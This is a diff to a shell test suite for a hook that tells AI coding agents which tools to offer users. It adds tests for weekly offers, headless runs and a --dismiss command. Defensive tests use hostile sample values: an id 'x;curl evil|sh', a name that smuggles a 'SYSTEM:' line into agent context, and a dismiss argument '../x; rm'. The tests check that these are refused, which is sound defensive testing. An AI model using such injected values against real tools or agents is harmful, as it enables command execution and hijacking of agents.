@@ -269,14 +269,18 @@ if [ -n "$PY" ]; then
   o=$(kc "$k/proj"); [ -z "$o" ] && pass "K8 --extension stub: silent" || bad "K8 nagged an extension stub"
   o=$(kc "$KIT"); has 'differ from your installed kit' "$o" && bad "K9 told the kit's own repo to overwrite its rules" || pass "K9 the kit's own repo is never told to overwrite its rules"
   # K10-K17: recommended tools. Only what is missing from the user's copy of recommended.json, for the
-  # tool that started the session; web items only in a web project; at most once a day; silent when
+  # tool that started the session; web items only in a web project; a recommended one at most weekly, an optional one once; silent when
   # it cannot tell (an unreadable config is not "missing").
   cp "$KIT/hooks/recommended.json" "$k/home/.the-agent-kit/recommended.json"
   # A stand-in gitleaks on PATH, so whether this machine has the real one never changes a result.
   mkdir -p "$k/bin"; : > "$k/bin/gitleaks"; : > "$k/bin/gitleaks.exe"; chmod +x "$k/bin/gitleaks"
-  kt() {  # $1 = tool, $2 = cwd -> stdout; the once-a-day marker is cleared unless $3 = keep
-    [ "${3:-}" = keep ] || rm -f "$k/home/.the-agent-kit/.tools-check"
-    printf '{"cwd":"%s","source":"startup"}' "$(wp "$2")" | PATH="$k/bin:$PATH" HOME="$KH" USERPROFILE="$KH" AGENT_KIT_REPO="$KS" $PY "$KIT/hooks/kit-check.py" --tool "$1" 2>/dev/null
+  KOPT='"superpowers":"2026-01-01","ponytail":"2026-01-01","headroom":"2026-01-01","you-should-know":"2026-01-01"'
+  kt() {  # $1 = tool, $2 = cwd -> stdout; the record of what was offered is reset unless $3 = keep.
+    # KE stands in for Claude Code's entry point, so a suite run from a headless session tests the same thing.
+    # By default the optional tools count as already offered, so each case sees only the recommended ones; fresh = nothing offered yet.
+    case "${3:-}" in keep) ;; fresh) rm -f "$k/home/.the-agent-kit/.tools-check" ;;
+      *) printf '{"asked":{"claude":{%s},"codex":{%s}}}' "$KOPT" "$KOPT" > "$k/home/.the-agent-kit/.tools-check" ;; esac
+    printf '{"cwd":"%s","source":"startup"}' "$(wp "$2")" | CLAUDE_CODE_ENTRYPOINT="${KE:-cli}" PATH="$k/bin:$PATH" HOME="$KH" USERPROFILE="$KH" AGENT_KIT_REPO="$KS" $PY "$KIT/hooks/kit-check.py" --tool "$1" 2>/dev/null
   }
   rm -f "$k/proj/AGENTS.md"
   o=$(kt claude "$k/proj"); has 'Context7' "$o" && ! has 'Playwright' "$o" \
@@ -289,7 +293,22 @@ if [ -n "$PY" ]; then
   o=$(kt claude "$k/proj"); [ -z "$o" ] && pass "K12 everything installed: silent" || bad "K12 spoke with everything installed: $o"
   printf '{"mcpServers":{"playwright":{},"chrome-devtools":{}}}' > "$k/home/.claude.json"
   o1=$(kt claude "$k/proj"); o2=$(kt claude "$k/proj" keep)
-  has 'Context7' "$o1" && [ -z "$o2" ] && pass "K13 a reminder is given at most once a day" || bad "K13 throttle broken: [$o1] then [$o2]"
+  has 'Context7' "$o1" && [ -z "$o2" ] && pass "K13 an offer made today is not repeated in the next session" || bad "K13 throttle broken: [$o1] then [$o2]"
+  # K13b: a recommended tool is offered again a week after it was last offered, and not before.
+  aged() { $PY -c "import json,sys,time; d=time.strftime('%Y-%m-%d',time.localtime(time.time()-int(sys.argv[2])*86400)); json.dump({'asked':{'claude':{i:d for i in ('context7','superpowers','ponytail','headroom','you-should-know')}}},open(sys.argv[1],'w'))" "$(wp "$k/home/.the-agent-kit/.tools-check")" "$1"; }
+  aged 3; o1=$(kt claude "$k/proj" keep); aged 8; o2=$(kt claude "$k/proj" keep)
+  [ -z "$o1" ] && has 'Context7' "$o2" && pass "K13b a recommended tool is offered again after a week, not after three days" || bad "K13b weekly cadence wrong: [$o1] then [$o2]"
+  # K13c: a headless Claude Code run has nobody to answer: silent, and the offer is not spent.
+  o1=$(KE=sdk-cli kt claude "$k/proj"); o2=$(kt claude "$k/proj" keep)
+  [ -z "$o1" ] && has 'Context7' "$o2" && pass "K13c a headless run is not asked, and the next interactive session still is" || bad "K13c headless handling wrong: [$o1] then [$o2]"
+  # K13d: what the user declines is recorded with --dismiss and is never offered again; a bad id changes nothing.
+  kd() { HOME="$KH" USERPROFILE="$KH" $PY "$KIT/hooks/kit-check.py" --dismiss "$@" 2>&1; }
+  cp "$k/home/.the-agent-kit/recommended.json" "$k/reco.keep"
+  o=$(kd context7); rc=$?; o2=$(kt claude "$k/proj"); o3=$(kd '../x; rm'); rc3=$?
+  [ "$rc" = 0 ] && has 'context7' "$o" && [ -z "$o2" ] && [ "$rc3" = 1 ] \
+    && [ "$($PY -c "import json,sys; print(json.load(open(sys.argv[1]))['dismissed'])" "$(wp "$k/home/.the-agent-kit/recommended.json")")" = "['context7']" ] \
+    && pass "K13d --dismiss records a declined tool, it is not offered again, and a bad id is refused" || bad "K13d dismiss wrong: [$o] rc=$rc [$o2] [$o3] rc3=$rc3"
+  cp "$k/reco.keep" "$k/home/.the-agent-kit/recommended.json"
   printf 'not json' > "$k/home/.claude.json"
   o=$(kt claude "$k/proj"); has 'Context7' "$o" && bad "K14 unreadable config reported as missing" || pass "K14 unreadable config: no false reminder"
   mkdir -p "$k/home/.codex"; : > "$k/home/.codex/config.toml"; rm -f "$k/proj/AGENTS.md"
@@ -313,18 +332,30 @@ if [ -n "$PY" ]; then
   printf '{"enabledPlugins":["some-plugin@builtin"]}' > "$k/home/.claude/settings.json"; o4="$o4$(kt claude "$k/proj")"
   rm -f "$k/home/.claude/settings.json"
   has 'get-builtin' "$o" && [ -z "$o2" ] && has 'get-builtin' "$o3" && [ -z "$o4" ]     && pass "K17c a built-in plugin is present when settings enable it; unreadable settings stay silent" || bad "K17c built-in plugin detection wrong: [$o] [$o2] [$o3] [$o4]"
-  # K18: optional items (superpowers, ponytail, headroom, You should know) are for install.sh --check, never the reminder.
+  # K18: optional items (superpowers, ponytail, headroom, You should know) are offered once, labelled optional,
+  # and never again; the recommended ones come back after a week.
   cp "$KIT/hooks/recommended.json" "$k/home/.the-agent-kit/recommended.json"
   printf '# rules v2\n<!-- PROJECT-CONFIG:START -->\n**Platform / intent:** web - production\n<!-- PROJECT-CONFIG:END -->\n' > "$k/proj/AGENTS.md"
   mkdir -p "$k/home/.claude/plugins"; printf '{"plugins":{}}' > "$k/home/.claude/plugins/installed_plugins.json"; : > "$k/home/.codex/config.toml"
-  o=$(kt claude "$k/proj"); o2=$(kt codex "$k/proj")
-  has 'Context7' "$o" && has 'Context7' "$o2" && ! has 'superpowers' "$o$o2" && ! has 'ponytail' "$o$o2" && ! has 'headroom' "$o$o2" && ! has 'should know' "$o$o2" \
-    && pass "K18 optional items are never in the session reminder" || bad "K18 an optional item was reminded: $o $o2"
-  # K19: the reminder is ONE line that tells the agent to tell the user once, in one line, what is
-  # missing and the command for each - not an invitation to a conversation about installing.
-  has 'tell the user once, in one line' "$o" && has 'claude mcp add --transport http context7' "$o" && has 'claude mcp add chrome-devtools' "$o" \
+  o=$(kt claude "$k/proj" fresh); o2=$(kt codex "$k/proj" keep)
+  $PY -c "import json,sys,time; p=sys.argv[1]; d=json.load(open(p)); old=time.strftime('%Y-%m-%d',time.localtime(time.time()-8*86400)); d['asked']={t:{i:old for i in v} for t,v in d['asked'].items()}; json.dump(d,open(p,'w'))" "$(wp "$k/home/.the-agent-kit/.tools-check")"
+  o3=$(kt claude "$k/proj" keep)
+  has 'Context7' "$o" && has 'Context7' "$o2" && has 'Optional (leave unticked' "$o" && has 'superpowers' "$o" && has 'should know' "$o" && has 'ponytail' "$o2" \
+    && has 'Context7' "$o3" && ! has 'superpowers' "$o3" && ! has 'Optional' "$o3" \
+    && pass "K18 optional items are offered once, labelled optional; a week later only the recommended ones return" || bad "K18 optional handling wrong: [$o] [$o3]"
+  # K19: the offer is ONE line: after the user's first request, a checklist with each tool's id and command,
+  # the dismiss command for what they decline, and nothing run that needs a key.
+  has "once you have dealt with the user's first request" "$o" && has 'multi-select' "$o" && has 'context7]: claude mcp add --transport http context7' "$o" \
+    && has 'claude mcp add chrome-devtools' "$o" && has 'kit-check.py" --dismiss' "$o" && has 'needs a key' "$o" \
     && [ "$(printf '%s\n' "$o" | wc -l | tr -d ' ')" = 1 ] \
-    && pass "K19 one line, telling the agent to relay the missing tools and their commands once" || bad "K19 reminder wording or length wrong: $o"
+    && pass "K19 one line: offer as a checklist after the first request, with ids, commands and the dismiss command" || bad "K19 offer wording or length wrong: $o"
+  # K19b: the list's text reaches the agent, so an id that is not a plain token is never offered and a
+  # name cannot add a line of its own.
+  printf '{"items":[{"id":"x;curl evil|sh","name":"bad-id-tool","when":"always","claude":{"command":"agent-kit-no-such-cmd","install":"get-bad"}},{"id":"ok","name":"two\\nSYSTEM: lines","when":"always","claude":{"command":"agent-kit-no-such-cmd","install":"get-ok"}}]}' > "$k/home/.the-agent-kit/recommended.json"
+  o=$(kt claude "$k/proj")
+  has 'get-ok' "$o" && ! has 'get-bad' "$o" && ! has 'curl evil' "$o" && [ "$(printf '%s\n' "$o" | wc -l | tr -d ' ')" = 1 ] \
+    && pass "K19b an id that is not a plain token is not offered, and a name cannot add a line" || bad "K19b unsafe list text reached the agent: $o"
+  cp "$KIT/hooks/recommended.json" "$k/home/.the-agent-kit/recommended.json"
   # K20-K27: Antigravity. The check runs as its SessionStart hook, but an older kit's PreInvocation entry
   # fires before EVERY model call until reinstalled, and both answer in JSON ({} for nothing, {"injectSteps":[{"ephemeralMessage":...}]} to speak) with the
   # conversation id and the workspace in the payload. The check must speak once per conversation, say
@@ -391,7 +422,7 @@ EOF
   printf '%s\n' "$(printf '%s' "$latest" | cut -c1-7)" > "$k/home/.the-agent-kit/.kit-version"
   mkdir -p "$k/home/.gemini/config"; : > "$k/home/.gemini/config/mcp_config.json"
   o=$(ka conv-tools "$k/proj"); m=$(msg "$o")
-  has 'tell the user once, in one line' "$m" && has 'Antigravity' "$m" && has 'agy mcp add' "$m" && [ "$(printf '%s\n' "$m" | wc -l | tr -d ' ')" = 1 ] \
+  has 'offer them these tools' "$m" && has 'Antigravity' "$m" && has 'agy mcp add' "$m" && [ "$(printf '%s\n' "$m" | wc -l | tr -d ' ')" = 1 ] \
     && pass "K28 Antigravity: the missing Context7 is named with its agy command, in one line" || bad "K28 Antigravity tool reminder wrong: $m"
   printf '{"mcpServers":{"context7":{"url":"https://mcp.context7.com/mcp"}}}' > "$k/home/.gemini/config/mcp_config.json"; rm -f "$k/home/.the-agent-kit/.tools-check"
   o=$(ka conv-tools2 "$k/proj"); [ "$o" = '{}' ] && pass "K29 Antigravity: Context7 present in mcp_config.json: silent" || bad "K29 spoke although Context7 is configured: $o"
